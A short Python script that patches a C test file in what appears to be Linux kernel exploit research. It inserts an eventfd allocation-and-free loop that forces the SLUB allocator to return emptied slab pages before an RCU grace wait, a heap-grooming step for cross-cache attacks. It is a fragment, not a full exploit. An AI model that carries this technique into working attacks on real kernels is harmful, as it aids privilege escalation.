import re

with open("tier2/scripts/test_hyp012_swaps.c", "r") as f:
    code = f.read()

new_drain = """    for (int i=0; i<32; i++) close(batch_a[i]);
    for (int i=0; i<32; i++) close(batch_b[i]);
    printf("[*] Slabs drained. Applying background pressure...\\n");
    
    // Background pressure to force SLUB to return empty pages to Buddy
    int bg[4000];
    for (int i=0; i<4000; i++) bg[i] = eventfd(0, 0);
    for (int i=0; i<4000; i++) close(bg[i]);
    
    printf("[*] Waiting RCU grace...\\n");
    sleep(2);
"""

code = code.replace("    for (int i=0; i<32; i++) close(batch_a[i]);\n    for (int i=0; i<32; i++) close(batch_b[i]);\n    printf(\"[*] Slabs drained. Waiting RCU grace...\\n\");\n    sleep(2);", new_drain)

with open("tier2/scripts/test_hyp012_swaps.c", "w") as f:
    f.write(code)
